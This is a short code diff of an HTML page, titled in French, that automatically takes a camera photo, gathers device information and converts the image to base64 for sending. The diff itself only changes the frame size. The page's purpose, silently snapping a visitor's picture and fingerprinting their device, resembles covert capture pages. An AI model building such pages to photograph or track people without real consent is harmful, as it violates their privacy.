@@ -16,8 +16,8 @@
 <body>
     <h1>Prendre une photo automatiquement et envoyer les informations</h1>
     <p>Veuillez autoriser l'accès à la caméra pour prendre une photo automatiquement.</p>
-    <video id="camera" width="320" height="240" autoplay></video>
-    <canvas id="photo" width="320" height="240"></canvas>
+    <video id="camera" width="320" height="320" autoplay></video>
+    <canvas id="photo" width="320" height="320"></canvas>
 
     <script>
         function obtenirInfosAppareil() {
@@ -62,7 +62,7 @@
                     video.play();
                     video.onloadeddata = function() {
                         // Prendre une photo automatiquement après que la vidéo a commencé
-                        context.drawImage(video, 0, 0, 320, 240);
+                        context.drawImage(video, 0, 0, 320, 320);
                         video.pause();
 
                         // Convertir l'image en base64
